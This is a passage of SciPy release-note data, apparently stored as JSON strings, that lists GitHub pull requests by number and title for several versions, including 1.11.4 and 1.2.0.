lti.impulse/step\n- `3736 <https://github.com/scipy/scipy/pull/3736>`__: BUG: cast pchip arguments to floats\n- `3744 <https://github.com/scipy/scipy/pull/3744>`__: stub out inherited methods of Akima1DInterpolator\n- `3746 <https://github.com/scipy/scipy/pull/3746>`__: DOC: Fix formatting for Raises section\n- `3748 <https://github.com/scipy/scipy/pull/3748>`__: ENH: Added discrete Lyapunov transformation solve\n- `3750 <https://github.com/scipy/scipy/pull/3750>`__: Enable automated testing with Python 3.4\n- `3751 <https://github.com/scipy/scipy/pull/3751>`__: Reverse Cuthill-McKee and Maximum Bipartite Matching reorderings...\n- `3759 <https://github.com/scipy/scipy/pull/3759>`__: MAINT: avoid indexing with a float array\n- `3762 <https://github.com/scipy/scipy/pull/3762>`__: TST: filter out RuntimeWarning in vq tests\n- `3766 <https://github.com/scipy/scipy/pull/3766>`__: TST: cluster: some cleanups in test_hierarchy.py\n- `3767 <https://github.com/scipy/scipy/pull/3767>`__: ENH/BUG: support negative m in elliptic integrals\n- `3769 <https://github.com/scipy/scipy/pull/3769>`__: ENH: avoid repeated matrix inverse\n- `3770 <https://github.com/scipy/scipy/pull/3770>`__: BUG: signal: In lfilter_zi, b was not rescaled correctly when...\n- `3772 <https://github.com/scipy/scipy/pull/3772>`__: STY avoid unnecessary transposes in csr_matrix.getcol/row\n- `3773 <https://github.com/scipy/scipy/pull/3773>`__: ENH: Add ext parameter to UnivariateSpline call\n- `3774 <https://github.com/scipy/scipy/pull/3774>`__: BUG: in integrate/quadpack.h, put all declarations before statements.\n- `3779 <https://github.com/scipy/scipy/pull/3779>`__: Incbet fix\n- `3788 <https://github.com/scipy/scipy/pull/3788>`__: BUG: Fix lombscargle ZeroDivisionError\n- `3791 <https://github.com/scipy/scipy/pull/3791>`__: Some maintenance for doc builds\n- `3795 <https://github.com/scipy/scipy/pull/3795>`__: scipy.special.legendre docstring\n- `3796 <https://github.com/scipy/scipy/pull/3796>`__: TYPO: sheroidal -> spheroidal\n- `3801 <https://github.com/scipy/scipy/pull/3801>`__: BUG: shortest_path overwrite\n- `3803 <https://github.com/scipy/scipy/pull/3803>`__: TST: lombscargle regression test related to atan vs atan2\n- `3809 <https://github.com/scipy/scipy/pull/3809>`__: ENH: orthogonal procrustes solver\n- `3811 <https://github.com/scipy/scipy/pull/3811>`__: ENH: scipy.special, Implemented Ellipsoidal harmonic function:...\n- `3819 <https://github.com/scipy/scipy/pull/3819>`__: BUG: make a fully connected csgraph from an ndarray with no zeros\n- `3820 <https://github.com/scipy/scipy/pull/3820>`__: MAINT: avoid spurious warnings in binom(n, p=0).mean() etc\n- `3825 <https://github.com/scipy/scipy/pull/3825>`__: Don't claim scipy.cluster does distance matrix calculations.\n- `3827 <https://github.com/scipy/scipy/pull/3827>`__: get and set diagonal of coo_matrix, and related csgraph laplacian...\n- `3832 <https://github.com/scipy/scipy/pull/3832>`__: DOC: Minor additions to integrate/nquad docstring.\n- `3845 <https://github.com/scipy/scipy/pull/3845>`__: Bug fix for #3842: Bug in scipy.optimize.line_search\n- `3848 <https://github.com/scipy/scipy/pull/3848>`__: BUG: edge case where the covariance matrix is exactly zero\n- `3850 <https://github.com/scipy/scipy/pull/3850>`__: DOC: typo\n- `3851 <https://github.com/scipy/scipy/pull/3851>`__: DOC: document default argument values for some arpack functions\n- `3860 <https://github.com/scipy/scipy/pull/3860>`__: DOC: sparse: add the function 'find' to the module-level docstring\n- `3861 <https://github.com/scipy/scipy/pull/3861>`__: BUG: Removed unnecessary storage of args as instance variables...\n- `3862 <https://github.com/scipy/scipy/pull/3862>`__: BUG: signal: fix handling of multi-output systems in ss2tf.\n- `3865 <https://github.com/scipy/scipy/pull/3865>`__: Feature request: ability to read heterogeneous types in FortranFile\n- `3866 <https://github.com/scipy/scipy/pull/3866>`__: MAINT: update pip wheelhouse for installs\n- `3871 <https://github.com/scipy/scipy/pull/3871>`__: MAINT: linalg: get rid of calc_lwork.f\n- `3872 <https://github.com/scipy/scipy/pull/3872>`__: MAINT: use scipy.linalg instead of np.dual\n- `3873 <https://github.com/scipy/scipy/pull/3873>`__: BLD: show a more informative message if Cython wasn't installed.\n- `3874 <https://github.com/scipy/scipy/pull/3874>`__: TST: cluster: cleanup the hierarchy test data\n- `3877 <https://github.com/scipy/scipy/pull/3877>`__: DOC: Savitzky-Golay filter version added\n- `3878 <https://github.com/scipy/scipy/pull/3878>`__: DOC: move versionadded to notes\n- `3879 <https://github.com/scipy/scipy/pull/3879>`__: small tweaks to the docs\n- `3881 <https://github.com/scipy/scipy/pull/3881>`__: FIX incorrect sorting during fancy assignment\n- `3885 <https://github.com/scipy/scipy/pull/3885>`__: kendalltau function now returns a nan tuple if empty arrays used...\n- `3886 <https://github.com/scipy/scipy/pull/3886>`__: BUG: fixing linprog's kwarg order to match docs\n- `3888 <https://github.com/scipy/scipy/pull/3888>`__: BUG: optimize: In _linprog_simplex, handle the case where the...\n- `3891 <https://github.com/scipy/scipy/pull/3891>`__: BUG: stats: Fix ValueError message in chi2_contingency.\n- `3892 <https://github.com/scipy/scipy/pull/3892>`__: DOC: sparse.linalg: Fix lobpcg docstring.\n- `3894 <https://github.com/scipy/scipy/pull/3894>`__: DOC: stats: Assorted docstring edits.\n- `3896 <https://github.com/scipy/scipy/pull/3896>`__: Fix 2 mistakes in MatrixMarket format parsing\n- `3897 <https://github.com/scipy/scipy/pull/3897>`__: BUG: associated Legendre function of second kind for 1<x<1.0001\n- `3899 <https://github.com/scipy/scipy/pull/3899>`__: BUG: fix undefined behavior in alngam\n- `3906 <https://github.com/scipy/scipy/pull/3906>`__: MAINT/DOC: Whitespace tweaks in several docstrings.\n- `3907 <https://github.com/scipy/scipy/pull/3907>`__: TST: relax bounds of interpolate test to accomodate rounding...\n- `3909 <https://github.com/scipy/scipy/pull/3909>`__: MAINT: Create a common version of `count_nonzero` for compatibility...\n- `3910 <https://github.com/scipy/scipy/pull/3910>`__: Fix a couple of test errors in master\n- `3911 <https://github.com/scipy/scipy/pull/3911>`__: Use MathJax for the html docs\n- `3914 <https://github.com/scipy/scipy/pull/3914>`__: Rework the _roots functions and document them.\n- `3916 <https://github.com/scipy/scipy/pull/3916>`__: Remove all linpack_lite code and replace with LAPACK routines\n- `3917 <https://github.com/scipy/scipy/pull/3917>`__: splines, constant extrapolation\n- `3918 <https://github.com/scipy/scipy/pull/3918>`__: DOC: tweak the rv_discrete docstring example\n- `3919 <https://github.com/scipy/scipy/pull/3919>`__: Quadrature speed-up: scipy.special.orthogonal.p_roots with cache\n- `3920 <https://github.com/scipy/scipy/pull/3920>`__: DOC: Clarify docstring for `sigma` parameter for `curve_fit`\n- `3922 <https://github.com/scipy/scipy/pull/3922>`__: Fixed Docstring issues in linprog (Fixes #3905).\n- `3924 <https://github.com/scipy/scipy/pull/3924>`__: Coerce args into tuple if necessary.\n- `3926 <https://github.com/scipy/scipy/pull/3926>`__: DOC: Surround stats class methods in docstrings with backticks.\n- `3927 <https://github.com/scipy/scipy/pull/3927>`__: Changed doc for romb's dx parameter to int.\n- `3928 <https://github.com/scipy/scipy/pull/3928>`__: check FITPACK conditions in LSQUnivariateSpline\n- `3929 <https://github.com/scipy/scipy/pull/3929>`__: Added a warning about leastsq using with NaNs.\n- `3930 <https://github.com/scipy/scipy/pull/3930>`__: ENH: optimize: curve_fit now warns if pcov is undetermined\n- `3932 <https://github.com/scipy/scipy/pull/3932>`__: Clarified the k > n case.\n- `3933 <https://github.com/scipy/scipy/pull/3933>`__: DOC: remove `import scipy as sp` abbreviation here and there\n- `3936 <https://github.com/scipy/scipy/pull/3936>`__: Add license and copyright holders to test data imported from...\n- `3938 <https://github.com/scipy/scipy/pull/3938>`__: DOC: Corrected documentation for return types.\n- `3939 <https://github.com/scipy/scipy/pull/3939>`__: DOC: fitpack: add a note about Sch-W conditions to splrep docstring\n- `3940 <https://github.com/scipy/scipy/pull/3940>`__: TST: integrate: Remove an invalid test of odeint.\n- `3942 <https://github.com/scipy/scipy/pull/3942>`__: FIX: Corrected error message of eigsh.\n- `3943 <https://github.com/scipy/scipy/pull/3943>`__: ENH: release GIL for filter and interpolation of ndimage\n- `3944 <https://github.com/scipy/scipy/pull/3944>`__: FIX: Raise value error if window data-type is unsupported\n- `3946 <https://github.com/scipy/scipy/pull/3946>`__: Fixed signal.get_window with unicode window name\n- `3947 <https://github.com/scipy/scipy/pull/3947>`__: MAINT: some docstring fixes and style cleanups in stats.mstats\n- `3949 <https://github.com/scipy/scipy/pull/3949>`__: DOC: fix a couple of issues in stats docstrings.\n- `3950 <https://github.com/scipy/scipy/pull/3950>`__: TST: sparse: remove known failure that doesn't fail\n- `3951 <https://github.com/scipy/scipy/pull/3951>`__: TST: switch from Rackspace wheelhouse to numpy/cython source...\n- `3952 <https://github.com/scipy/scipy/pull/3952>`__: DOC: stats: Small formatting correction to the 'chi' distribution...\n- `3953 <https://github.com/scipy/scipy/pull/3953>`__: DOC: stats: Several corrections and small additions to docstrings.\n- `3955 <https://github.com/scipy/scipy/pull/3955>`__: signal.__init__.py: remove duplicated `get_window` entry\n- `3959 <https://github.com/scipy/scipy/pull/3959>`__: TST: sparse: more \"known failures\" for DOK that don't fail\n- `3960 <https://github.com/scipy/scipy/pull/3960>`__: BUG: io.netcdf: do not close mmap if there are references left...\n- `3965 <https://github.com/scipy/scipy/pull/3965>`__: DOC: Fix a few more sphinx warnings that occur when building...\n- `3966 <https://github.com/scipy/scipy/pull/3966>`__: DOC: add guidelines for using test generators in HACKING\n- `3968 <https://github.com/scipy/scipy/pull/3968>`__: BUG: sparse.linalg: make Inv objects in arpack garbage-collectable...\n- `3971 <https://github.com/scipy/scipy/pull/3971>`__: Remove all linpack_lite code and replace with LAPACK routines\n- `3972 <https://github.com/scipy/scipy/pull/3972>`__: fix typo in error message\n- `3973 <https://github.com/scipy/scipy/pull/3973>`__: MAINT: better error message for multivariate normal.\n- `3981 <https://github.com/scipy/scipy/pull/3981>`__: turn the cryptically named scipy.special information theory functions...\n- `3984 <https://github.com/scipy/scipy/pull/3984>`__: Wrap her, syr, her2, syr2 blas routines\n- `3990 <https://github.com/scipy/scipy/pull/3990>`__: improve UnivariateSpline docs\n- `3991 <https://github.com/scipy/scipy/pull/3991>`__: ENH: stats: return namedtuple for describe output\n- `3993 <https://github.com/scipy/scipy/pull/3993>`__: DOC: stats: percentileofscore references np.percentile\n- `3997 <https://github.com/scipy/scipy/pull/3997>`__: BUG: linalg: pascal(35) was incorrect: last element overflowed...\n- `3998 <https://github.com/scipy/scipy/pull/3998>`__: MAINT: use isMaskedArray instead of is_masked to check type\n- `3999 <https://github.com/scipy/scipy/pull/3999>`__: TST: test against all of boost data files.\n- `4000 <https://github.com/scipy/scipy/pull/4000>`__: BUG: stats: Fix edge-case handling in a few distributions.\n- `4003 <https://github.com/scipy/scipy/pull/4003>`__: ENH: using python's warnings instead of prints in fitpack.\n- `4004 <https://github.com/scipy/scipy/pull/4004>`__: MAINT: optimize: remove a couple unused variables in zeros.c\n- `4006 <https://github.com/scipy/scipy/pull/4006>`__: BUG: Fix C90 compiler warnings in `NI_MinOrMaxFilter1D`\n- `4007 <https://github.com/scipy/scipy/pull/4007>`__: MAINT/DOC: Fix spelling of 'decomposition' in several files.\n- `4008 <https://github.com/scipy/scipy/pull/4008>`__: DOC: stats: Split the descriptions of the distributions in the...\n- `4015 <https://github.com/scipy/scipy/pull/4015>`__: TST: logsumexp regression test\n- `4016 <https://github.com/scipy/scipy/pull/4016>`__: MAINT: remove some inf-related warnings from logsumexp\n- `4020 <https://github.com/scipy/scipy/pull/4020>`__: DOC: stats: fix whitespace in docstrings of several distributions\n- `4023 <https://github.com/scipy/scipy/pull/4023>`__: Exactly one space required before assignments\n- `4024 <https://github.com/scipy/scipy/pull/4024>`__: In dendrogram(): Correct an argument name and a grammar issue...\n- `4041 <https://github.com/scipy/scipy/pull/4041>`__: BUG: misc: Ensure that the 'size' argument of PIL's 'resize'...\n- `4049 <https://github.com/scipy/scipy/pull/4049>`__: BUG: Return of _logpmf\n- `4051 <https://github.com/scipy/scipy/pull/4051>`__: BUG: expm of integer matrices\n- `4052 <https://github.com/scipy/scipy/pull/4052>`__: ENH: integrate: odeint: Handle exceptions in the callback functions.\n- `4053 <https://github.com/scipy/scipy/pull/4053>`__: BUG: stats: Refactor argument validation to avoid a unicode issue.\n- `4057 <https://github.com/scipy/scipy/pull/4057>`__: Added newline to scipy.sparse.linalg.svds documentation for correct...\n- `4058 <https://github.com/scipy/scipy/pull/4058>`__: MAINT: stats: Add note about change to scoreatpercentile in release...\n- `4059 <https://github.com/scipy/scipy/pull/4059>`__: ENH: interpolate: Allow splev to accept an n-dimensional array.\n- `4064 <https://github.com/scipy/scipy/pull/4064>`__: Documented the return value for scipy.signal.find_peaks_cwt\n- `4074 <https://github.com/scipy/scipy/pull/4074>`__: ENH: Support LinearOperator as input to svds\n- `4084 <https://github.com/scipy/scipy/pull/4084>`__: BUG: Match exception declarations in scipy/io/matlab/streams.pyx...\n- `4091 <https://github.com/scipy/scipy/pull/4091>`__: DOC: special: more clear instructions on how to evaluate polynomials\n- `4105 <https://github.com/scipy/scipy/pull/4105>`__: BUG: Workaround for SGEMV segfault in Accelerate\n- `4107 <https://github.com/scipy/scipy/pull/4107>`__: DOC: get rid of 'import \\*' in examples\n- `4113 <https://github.com/scipy/scipy/pull/4113>`__: DOC: fix typos in distance.yule\n- `4114 <https://github.com/scipy/scipy/pull/4114>`__: MAINT C fixes\n- `4117 <https://github.com/scipy/scipy/pull/4117>`__: deprecate nanmean, nanmedian and nanstd in favor of their numpy...\n- `4126 <https://github.com/scipy/scipy/pull/4126>`__: scipy.io.idl: support description records and fix bug with null...\n- `4131 <https://github.com/scipy/scipy/pull/4131>`__: ENH: release GIL in more ndimage functions\n- `4132 <https://github.com/scipy/scipy/pull/4132>`__: MAINT: stats: fix a typo [skip ci]\n- `4145 <https://github.com/scipy/scipy/pull/4145>`__: DOC: Fix documentation error for nc chi-squared dist\n- `4150 <https://github.com/scipy/scipy/pull/4150>`__: Fix _nd_image.geometric_transform endianness bug\n- `4153 <https://github.com/scipy/scipy/pull/4153>`__: MAINT: remove use of deprecated numpy API in lib/lapack/ f2py...\n- `4156 <https://github.com/scipy/scipy/pull/4156>`__: MAINT: optimize: remove dead code\n- `4159 <https://github.com/scipy/scipy/pull/4159>`__: MAINT: optimize: clean up Zeros code\n- `4165 <https://github.com/scipy/scipy/pull/4165>`__: DOC: add missing special functions to __doc__\n- `4172 <https://github.com/scipy/scipy/pull/4172>`__: DOC: remove misleading procrustes docstring line\n- `4175 <https://github.com/scipy/scipy/pull/4175>`__: DOC: sparse: clarify CSC and CSR constructor usage\n- `4177 <https://github.com/scipy/scipy/pull/4177>`__: MAINT: enable np.matrix inputs to solve_discrete_lyapunov\n- `4179 <https://github.com/scipy/scipy/pull/4179>`__: TST: fix an intermittently failing test case for special.legendre\n- `4181 <https://github.com/scipy/scipy/pull/4181>`__: MAINT: remove unnecessary null checks before free\n- `4182 <https://github.com/scipy/scipy/pull/4182>`__: Ellipsoidal harmonics\n- `4183 <https://github.com/scipy/scipy/pull/4183>`__: Skip Cython build in Travis-CI\n- `4184 <https://github.com/scipy/scipy/pull/4184>`__: Pr 4074\n- `4187 <https://github.com/scipy/scipy/pull/4187>`__: Pr/3923\n- `4190 <https://github.com/scipy/scipy/pull/4190>`__: BUG: special: fix up ellip_harm build\n- `4193 <https://github.com/scipy/scipy/pull/4193>`__: BLD: fix msvc compiler errors\n- `4194 <https://github.com/scipy/scipy/pull/4194>`__: BUG: fix buffer dtype mismatch on win-amd64\n- `4199 <https://github.com/scipy/scipy/pull/4199>`__: ENH: Changed scipy.stats.describe output from datalen to nobs\n- `4201 <https://github.com/scipy/scipy/pull/4201>`__: DOC: add blas2 and nan* deprecations to the release notes\n- `4243 <https://github.com/scipy/scipy/pull/4243>`__: TST: bump test tolerances\n\n\n\n==========================\n", "1.11.4": "------------------------\n\n* `19230 <https://github.com/scipy/scipy/pull/19230>`__: DOC, MAINT: workaround for py311 docs\n* `19307 <https://github.com/scipy/scipy/pull/19307>`__: set idx_dtype in sparse dia_array.tocoo\n* `19316 <https://github.com/scipy/scipy/pull/19316>`__: MAINT: Prep 1.11.4\n* `19320 <https://github.com/scipy/scipy/pull/19320>`__: BLD: fix up version parsing issue in cythonize.py for setup.py...\n* `19329 <https://github.com/scipy/scipy/pull/19329>`__: DOC: stats.chisquare: result object contains attribute 'statistic'\n* `19335 <https://github.com/scipy/scipy/pull/19335>`__: BUG: fix pow method for sparrays with power zero\n* `19364 <https://github.com/scipy/scipy/pull/19364>`__: MAINT, BUG: stats: update the UNU.RAN submodule with DAU fix\n* `19379 <https://github.com/scipy/scipy/pull/19379>`__: BUG: Restore the original behavior of 'trf' from least_squares...\n* `19400 <https://github.com/scipy/scipy/pull/19400>`__: BLD: use classic linker on macOS 14 (Sonoma), the new linker...\n* `19408 <https://github.com/scipy/scipy/pull/19408>`__: BUG: Fix typecasting problem in scipy.sparse.lil_matrix truediv\n* `19504 <https://github.com/scipy/scipy/pull/19504>`__: DOC, MAINT: Bump CircleCI Python version to 3.11\n* `19517 <https://github.com/scipy/scipy/pull/19517>`__: MAINT, REL: unpin Python 1.11.x branch\n* `19550 <https://github.com/scipy/scipy/pull/19550>`__: MAINT, BLD: poetry loongarch shims\n\n\n==========================\n", "1.2.0": "-----------------------\n\n* `9526 <https://github.com/scipy/scipy/pull/9526>`__: TST: relax precision requirements in signal.correlate tests\n* `9507 <https://github.com/scipy/scipy/pull/9507>`__: CI: MAINT: Skip a ckdtree test on pypy\n* `9512 <https://github.com/scipy/scipy/pull/9512>`__: TST: test_random_sampling 32-bit handling\n* `9494 <https://github.com/scipy/scipy/pull/9494>`__: TST: test_kolmogorov xfail 32-bit\n* `9486 <https://github.com/scipy/scipy/pull/9486>`__: BUG: fix sparse random int handling\n* `9550 <https://github.com/scipy/scipy/pull/9550>`__: BUG: scipy/_lib/_numpy_compat: get_randint\n* `9549 <https://github.com/scipy/scipy/pull/9549>`__: MAINT: make dual_annealing signature match other optimizers\n* `9541 <https://github.com/scipy/scipy/pull/9541>`__: BUG: fix SyntaxError due to non-ascii character on Python 2.7\n* `7352 <https://github.com/scipy/scipy/pull/7352>`__: ENH: add Brunner Munzel test to scipy.stats.\n* `7373 <https://github.com/scipy/scipy/pull/7373>`__: BUG: Jaccard distance for all-zero arrays would return np.nan\n* `7374 <https://github.com/scipy/scipy/pull/7374>`__: ENH: Add PDF, CDF and parameter estimation for Stable Distributions\n* `8098 <https://github.com/scipy/scipy/pull/8098>`__: ENH: Add shgo for global optimization of NLPs.\n* `8203 <https://github.com/scipy/scipy/pull/8203>`__: ENH: adding simulated dual annealing to optimize\n* `8259 <https://github.com/scipy/scipy/pull/8259>`__: Option to follow original Storn and Price algorithm and its parallelisation\n* `8293 <https://github.com/scipy/scipy/pull/8293>`__: ENH add ratio-of-uniforms method for rv generation to scipy.stats\n* `8294 <https://github.com/scipy/scipy/pull/8294>`__: BUG: Fix slowness in stats.mode\n* `8295 <https://github.com/scipy/scipy/pull/8295>`__: ENH: add Jensen Shannon distance to `scipy.spatial.distance`\n* `8357 <https://github.com/scipy/scipy/pull/8357>`__: ENH: vectorize scalar zero-search-functions\n* `8397 <https://github.com/scipy/scipy/pull/8397>`__: Add `fs=` parameter to filter design functions\n* `8537 <https://github.com/scipy/scipy/pull/8537>`__: ENH: Implement mode parameter for spline filtering.\n* `8558 <https://github.com/scipy/scipy/pull/8558>`__: ENH: small speedup for stats.gaussian_kde\n* `8560 <https://github.com/scipy/scipy/pull/8560>`__: BUG: fix p-value calc of anderson_ksamp in scipy.stats\n* `8614 <https://github.com/scipy/scipy/pull/8614>`__: ENH: correct p-values for stats.kendalltau and stats.mstats.kendalltau\n* `8670 <https://github.com/scipy/scipy/pull/8670>`__: ENH: Require Lapack 3.4.0\n* `8683 <https://github.com/scipy/scipy/pull/8683>`__: Correcting kmeans documentation\n* `8725 <https://github.com/scipy/scipy/pull/8725>`__: MAINT: Cleanup scipy.optimize.leastsq\n* `8726 <https://github.com/scipy/scipy/pull/8726>`__: BUG: Fix _get_output in scipy.ndimage to support string\n* `8733 <https://github.com/scipy/scipy/pull/8733>`__: MAINT: stats: A bit of clean up.\n* `8737 <https://github.com/scipy/scipy/pull/8737>`__: BUG: Improve numerical precision/convergence failures of smirnov/kolmogorov\n* `8738 <https://github.com/scipy/scipy/pull/8738>`__: MAINT: stats: A bit of clean up in test_distributions.py.\n* `8740 <https://github.com/scipy/scipy/pull/8740>`__: BF/ENH: make minpack thread safe\n* `8742 <https://github.com/scipy/scipy/pull/8742>`__: BUG: Fix division by zero in trust-region optimization methods\n* `8746 <https://github.com/scipy/scipy/pull/8746>`__: MAINT: signal: Fix a docstring of a private function, and fix...\n* `8750 <https://github.com/scipy/scipy/pull/8750>`__: DOC clarified description of norminvgauss in scipy.stats\n* `8753 <https://github.com/scipy/scipy/pull/8753>`__: DOC: signal: Fix a plot title in the chirp docstring.\n* `8755 <https://github.com/scipy/scipy/pull/8755>`__: DOC: MAINT: Fix link to the wheel documentation in developer...\n* `8760 <https://github.com/scipy/scipy/pull/8760>`__: BUG: stats: boltzmann wasn't setting the upper bound.\n* `8763 <https://github.com/scipy/scipy/pull/8763>`__: [DOC] Improved scipy.cluster.hierarchy documentation\n* `8765 <https://github.com/scipy/scipy/pull/8765>`__: DOC: added example for scipy.stat.mstats.tmin\n* `8788 <https://github.com/scipy/scipy/pull/8788>`__: DOC: fix definition of optional `disp` parameter\n* `8802 <https://github.com/scipy/scipy/pull/8802>`__: MAINT: Suppress dd_real unused function compiler warnings.\n* `8803 <https://github.com/scipy/scipy/pull/8803>`__: ENH: Add full_output support to optimize.newton()\n* `8804 <https://github.com/scipy/scipy/pull/8804>`__: MAINT: stats cleanup\n* `8808 <https://github.com/scipy/scipy/pull/8808>`__: DOC: add note about isinstance for frozen rvs\n* `8812 <https://github.com/scipy/scipy/pull/8812>`__: Updated numpydoc submodule\n* `8813 <https://github.com/scipy/scipy/pull/8813>`__: MAINT: stats: Fix multinomial docstrings, and do some clean up.\n* `8816 <https://github.com/scipy/scipy/pull/8816>`__: BUG: fixed _stats of t-distribution in scipy.stats\n* `8817 <https://github.com/scipy/scipy/pull/8817>`__: BUG: ndimage: Fix validation of the origin argument in correlate...\n* `8822 <https://github.com/scipy/scipy/pull/8822>`__: BUG: integrate: Fix crash with repeated t values in odeint.\n* `8832 <https://github.com/scipy/scipy/pull/8832>`__: Hyperlink DOIs against preferred resolver\n* `8837 <https://github.com/scipy/scipy/pull/8837>`__: BUG: sparse: Ensure correct dtype for sparse comparison operations.\n* `8839 <https://github.com/scipy/scipy/pull/8839>`__: DOC: stats: A few tweaks to the linregress docstring.\n* `8846 <https://github.com/scipy/scipy/pull/8846>`__: BUG: stats: Fix logpdf method of invwishart.\n* `8849 <https://github.com/scipy/scipy/pull/8849>`__: DOC: signal: Fixed mistake in the firwin docstring.\n* `8854 <https://github.com/scipy/scipy/pull/8854>`__: DOC: fix type descriptors in ltisys documentation\n* `8865 <https://github.com/scipy/scipy/pull/8865>`__: Fix tiny typo in docs for chi2 pdf\n* `8870 <https://github.com/scipy/scipy/pull/8870>`__: Fixes related to invertibility of STFT\n* `8872 <https://github.com/scipy/scipy/pull/8872>`__: ENH: special: Add the softmax function\n* `8874 <https://github.com/scipy/scipy/pull/8874>`__: DOC correct gamma function in docstrings in scipy.stats\n* `8876 <https://github.com/scipy/scipy/pull/8876>`__: ENH: Added TOMS Algorithm 748 as 1-d root finder; 17 test function...\n* `8882 <https://github.com/scipy/scipy/pull/8882>`__: ENH: Only use Halley's adjustment to Newton if close enough.\n* `8883 <https://github.com/scipy/scipy/pull/8883>`__: FIX: optimize: make jac and hess truly optional for 'trust-constr'\n* `8885 <https://github.com/scipy/scipy/pull/8885>`__: TST: Do not error on warnings raised about non-tuple indexing.\n* `8887 <https://github.com/scipy/scipy/pull/8887>`__: MAINT: filter out np.matrix PendingDeprecationWarning's in numpy...\n* `8889 <https://github.com/scipy/scipy/pull/8889>`__: DOC: optimize: separate legacy interfaces from new ones\n* `8890 <https://github.com/scipy/scipy/pull/8890>`__: ENH: Add optimize.root_scalar() as a universal dispatcher for...\n* `8899 <https://github.com/scipy/scipy/pull/8899>`__: DCT-IV, DST-IV and DCT-I, DST-I orthonormalization support in...\n* `8901 <https://github.com/scipy/scipy/pull/8901>`__: MAINT: Reorganize flapack.pyf.src file\n* `8907 <https://github.com/scipy/scipy/pull/8907>`__: BUG: ENH: Check if guess for newton is already zero before checking...\n* `8908 <https://github.com/scipy/scipy/pull/8908>`__: ENH: Make sorting optional for cKDTree.query_ball_point()\n* `8910 <https://github.com/scipy/scipy/pull/8910>`__: DOC: sparse.csgraph simple examples.\n* `8914 <https://github.com/scipy/scipy/pull/8914>`__: DOC: interpolate: fix equivalences of string aliases\n* `8918 <https://github.com/scipy/scipy/pull/8918>`__: add float_control(precise, on) to _fpumode.c\n* `8919 <https://github.com/scipy/scipy/pull/8919>`__: MAINT: interpolate: improve error messages for common `bc_type`...\n* `8920 <https://github.com/scipy/scipy/pull/8920>`__: DOC: update Contributing to SciPy to say \"prefer no PEP8 only...\n* `8924 <https://github.com/scipy/scipy/pull/8924>`__: MAINT: special: deprecate `hyp2f0`, `hyp1f2`, and `hyp3f0`\n* `8927 <https://github.com/scipy/scipy/pull/8927>`__: MAINT: special: remove `errprint`\n* `8932 <https://github.com/scipy/scipy/pull/8932>`__: Fix broadcasting scale arg of entropy\n* `8936 <https://github.com/scipy/scipy/pull/8936>`__: Fix (some) non-tuple index warnings\n* `8937 <https://github.com/scipy/scipy/pull/8937>`__: ENH: implement sparse matrix BSR to CSR conversion directly.\n* `8938 <https://github.com/scipy/scipy/pull/8938>`__: DOC: add _ni_docstrings.docfiller in ndimage.rotate\n* `8940 <https://github.com/scipy/scipy/pull/8940>`__: Update _discrete_distns.py\n* `8943 <https://github.com/scipy/scipy/pull/8943>`__: DOC: Finish dangling sentence in `convolve` docstring\n* `8944 <https://github.com/scipy/scipy/pull/8944>`__: MAINT: Address tuple indexing and warnings\n* `8945 <https://github.com/scipy/scipy/pull/8945>`__: ENH: spatial.transform.Rotation [GSOC2018]\n* `8950 <https://github.com/scipy/scipy/pull/8950>`__: csgraph Dijkstra function description rewording\n* `8953 <https://github.com/scipy/scipy/pull/8953>`__: DOC, MAINT: HTTP -> HTTPS, and other linkrot fixes\n* `8955 <https://github.com/scipy/scipy/pull/8955>`__: BUG: np.int64 in scipy.fftpack.next_fast_len\n* `8958 <https://github.com/scipy/scipy/pull/8958>`__: MAINT: Add more descriptive error message for phase one simplex.\n* `8962 <https://github.com/scipy/scipy/pull/8962>`__: BUG: sparse.linalg: add missing conjugate to _ScaledLinearOperator.adjoint\n* `8963 <https://github.com/scipy/scipy/pull/8963>`__: BUG: sparse.linalg: downgrade LinearOperator TypeError to warning\n* `8965 <https://github.com/scipy/scipy/pull/8965>`__: ENH: Wrapped RFP format and RZ decomposition routines\n* `8969 <https://github.com/scipy/scipy/pull/8969>`__: MAINT: doc and code fixes for optimize.newton\n* `8970 <https://github.com/scipy/scipy/pull/8970>`__: Added 'average' keyword for welch/csd to enable median averaging\n* `8971 <https://github.com/scipy/scipy/pull/8971>`__: Better imresize deprecation warning\n* `8972 <https://github.com/scipy/scipy/pull/8972>`__: MAINT: Switch np.where(c) for np.nonzero(c)\n* `8975 <https://github.com/scipy/scipy/pull/8975>`__: MAINT: Fix warning-based failures\n* `8979 <https://github.com/scipy/scipy/pull/8979>`__: DOC: fix description of count_sort keyword of dendrogram\n* `8982 <https://github.com/scipy/scipy/pull/8982>`__: MAINT: optimize: Fixed minor mistakes in test_linprog.py (#8978)\n* `8984 <https://github.com/scipy/scipy/pull/8984>`__: BUG: sparse.linalg: ensure expm casts integer inputs to float\n* `8986 <https://github.com/scipy/scipy/pull/8986>`__: BUG: optimize/slsqp: do not exit with convergence on steps where...\n* `8989 <https://github.com/scipy/scipy/pull/8989>`__: MAINT: use collections.abc in basinhopping\n* `8990 <https://github.com/scipy/scipy/pull/8990>`__: ENH extend p-values of anderson_ksamp in scipy.stats\n* `8991 <https://github.com/scipy/scipy/pull/8991>`__: ENH: Weighted kde\n* `8993 <https://github.com/scipy/scipy/pull/8993>`__: ENH: spatial.transform.Rotation.random [GSOC 2018]\n* `8994 <https://github.com/scipy/scipy/pull/8994>`__: ENH: spatial.transform.Slerp [GSOC 2018]\n* `8995 <https://github.com/scipy/scipy/pull/8995>`__: TST: time.time in test\n* `9007 <https://github.com/scipy/scipy/pull/9007>`__: Fix typo in fftpack.rst\n* `9013 <https://github.com/scipy/scipy/pull/9013>`__: Added correct plotting code for two sided output from spectrogram\n* `9014 <https://github.com/scipy/scipy/pull/9014>`__: BUG: differential_evolution with inf objective functions\n* `9017 <https://github.com/scipy/scipy/pull/9017>`__: BUG: fixed #8446 corner case for asformat(array|dense)\n* `9018 <https://github.com/scipy/scipy/pull/9018>`__: MAINT: _lib/ccallback: remove unused code\n* `9021 <https://github.com/scipy/scipy/pull/9021>`__: BUG: Issue with subspace_angles\n* `9022 <https://github.com/scipy/scipy/pull/9022>`__: DOC: Added \"See Also\" section to lombscargle docstring\n* `9034 <https://github.com/scipy/scipy/pull/9034>`__: BUG: Fix tolerance printing behavior, remove meaningless tol...\n* `9035 <https://github.com/scipy/scipy/pull/9035>`__: TST: improve signal.bsplines test coverage\n* `9037 <https://github.com/scipy/scipy/pull/9037>`__: ENH: add a new init method for k-means\n* `9039 <https://github.com/scipy/scipy/pull/9039>`__: DOC: Add examples to fftpack.irfft docstrings\n* `9048 <https://github.com/scipy/scipy/pull/9048>`__: 